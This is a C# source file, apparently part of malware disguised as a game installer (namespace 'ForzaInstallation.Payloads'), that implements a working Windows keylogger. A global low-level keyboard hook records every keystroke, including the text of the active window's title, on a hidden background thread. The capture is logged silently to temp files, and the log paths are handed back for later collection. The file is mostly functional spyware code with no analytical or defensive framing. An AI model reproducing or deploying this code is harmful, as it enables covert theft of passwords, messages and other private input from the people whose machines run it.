using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ForzaInstallation.Payloads
{
    internal static class Keylogger
    {
        const int WH_KEYBOARD_LL = 13;

        static IntPtr _hookId = IntPtr.Zero;
        static Thread _thread;
        static StringBuilder _buffer;
        static string _logPath;
        static bool _running;
        static object _lock = new object();
        static ApplicationContext _ctx;
        static string _currentWindow;
        static int _counter;

        delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        static LowLevelKeyboardProc _proc;
        static GCHandle _procHandle;

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        static extern short GetKeyState(int nVirtKey);
        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);
        [DllImport("user32.dll")]
        static extern int ToAscii(uint uVirtKey, uint uScanCode, byte[] lpKeyState, ref uint lpChar, uint uFlags);

        internal static void Start()
        {
            if (_running) return;
            _running = true;
            _buffer = new StringBuilder(51200);
            _logPath = Path.Combine(Path.GetTempPath(), "kl_" + Process.GetCurrentProcess().Id + ".log");
            _proc = new LowLevelKeyboardProc(HookCallback);
            _procHandle = GCHandle.Alloc(_proc);
            _thread = new Thread(new ThreadStart(HookThread)) { IsBackground = true, Name = "KL" };
            _thread.SetApartmentState(ApartmentState.STA);
            _thread.Start();
        }

        internal static void Stop()
        {
            _running = false;
            try
            {
                if (_hookId != IntPtr.Zero) { UnhookWindowsHookEx(_hookId); _hookId = IntPtr.Zero; }
            }
            catch { }
            try { if (_ctx != null) { _ctx.ExitThread(); } } catch { }
            FlushBuffer();
            if (_procHandle.IsAllocated) _procHandle.Free();
        }

        internal static string GetLogs()
        {
            string path = null;
            lock (_lock)
            {
                FlushBuffer();
                if (File.Exists(_logPath))
                {
                    path = _logPath;
                }
                _logPath = Path.Combine(Path.GetTempPath(), "kl_" + Process.GetCurrentProcess().Id + "_" + DateTime.Now.Ticks.ToString() + ".log");
                if (_buffer == null) _buffer = new StringBuilder(51200);
                else _buffer.Clear();
            }
            return path;
        }

        internal static string GetLogPath()
        {
            return _logPath;
        }

        static void HookThread()
        {
            try
            {
                _ctx = new ApplicationContext();
                _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(null), 0);
                if (_hookId != IntPtr.Zero)
                    Application.Run(_ctx);
            }
            catch { }
        }

        static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && ((int)wParam == 0x0100 || (int)wParam == 0x0104))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                RecordKey(vkCode);
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        static void RecordKey(int vk)
        {
            _counter++;
            if (_counter % 50 == 0) UpdateWindowTitle();

            lock (_lock)
            {
                if (vk == 0x0D) { _buffer.AppendLine(" [ENTER]"); FlushIfNeeded(); return; }
                if (vk == 0x08) { if (_buffer.Length > 0) _buffer.Remove(_buffer.Length - 1, 1); FlushIfNeeded(); return; }
                if (vk == 0x09) { _buffer.Append("[TAB]"); FlushIfNeeded(); return; }
                if (vk == 0x1B) { _buffer.Append("[ESC]"); FlushIfNeeded(); return; }
                if (vk >= 0x70 && vk <= 0x87) { _buffer.Append("[F" + (vk - 0x70 + 1) + "]"); FlushIfNeeded(); return; }
                if (vk == 0x2E) { _buffer.Append("[DEL]"); FlushIfNeeded(); return; }
                if (vk == 0x24) { _buffer.Append("[HOME]"); FlushIfNeeded(); return; }
                if (vk == 0x23) { _buffer.Append("[END]"); FlushIfNeeded(); return; }
                if (vk == 0x21) { _buffer.Append("[PGUP]"); FlushIfNeeded(); return; }
                if (vk == 0x22) { _buffer.Append("[PGDN]"); FlushIfNeeded(); return; }
                if (vk == 0x25 || vk == 0x26 || vk == 0x27 || vk == 0x28) return;
                if (vk == 0x10 || vk == 0x11 || vk == 0x12 || vk == 0x14 || vk == 0x15 || vk == 0xA0 || vk == 0xA1 || vk == 0xA2 || vk == 0xA3 || vk == 0xA4 || vk == 0xA5) return;

                byte[] keyState = new byte[256];
                try
                {
                    keyState[0x10] = (byte)((GetKeyState(0x10) & 0x80) != 0 ? 0x80 : 0);
                    keyState[0x14] = (byte)((GetKeyState(0x14) & 0x01) != 0 ? 1 : 0);
                    keyState[0xA0] = (byte)((GetKeyState(0xA0) & 0x80) != 0 ? 0x80 : 0);
                    keyState[0xA1] = (byte)((GetKeyState(0xA1) & 0x80) != 0 ? 0x80 : 0);
                }
                catch { }

                uint chars = 0;
                int ret = ToAscii((uint)vk, MapVirtualKey((uint)vk, 0), keyState, ref chars, 0);
                if (ret > 0)
                {
                    char c = (char)(chars & 0xFF);
                    if (c >= 0x20 && c <= 0x7E)
                        _buffer.Append(c);
                    else
                        _buffer.Append(c);
                }

                if (_buffer.Length > 50000) FlushBuffer();
            }
        }

        static void UpdateWindowTitle()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                if (hwnd != IntPtr.Zero)
                {
                    var sb = new StringBuilder(256);
                    if (GetWindowText(hwnd, sb, 256) > 0)
                    {
                        string title = sb.ToString();
                        if (title != _currentWindow)
                        {
                            _currentWindow = title;
                            lock (_lock)
                            {
                                _buffer.AppendLine();
                                _buffer.AppendLine("=== " + title + " ===");
                            }
                        }
                    }
                }
            }
            catch { }
        }

        static void FlushIfNeeded()
        {
            if (_buffer.Length > 500) FlushBuffer();
        }

        static void FlushBuffer()
        {
            try
            {
                string data;
                lock (_lock)
                {
                    if (_buffer == null || _buffer.Length == 0) return;
                    data = _buffer.ToString();
                    _buffer.Clear();
                }
                File.AppendAllText(_logPath, DateTime.Now.ToString("HH:mm:ss ") + data + Environment.NewLine);
            }
            catch { }
        }
    }
}
